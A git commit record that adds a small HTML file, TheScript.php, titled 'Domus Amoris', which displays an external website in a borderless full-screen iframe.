b1d943e819c790d9e08c49bfd95168b3e6688fd7
mnuradli1 <mnuradli1@gmail.com>
2017-05-22 13:51:32 +0700

    Create TheScript.php

---
+++ TheScript.php
@@ -0,0 +1,15 @@
+<head>
+<title>
+Domus Amoris
+</title>
+<style>
+body {
+    margin: 0;
+}
+</style>
+</head>
+<body>
+<iframe src="http://vimaned.jatayuweb.com" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
+    Your browser doesn't support iframes
+</iframe>
+</body>
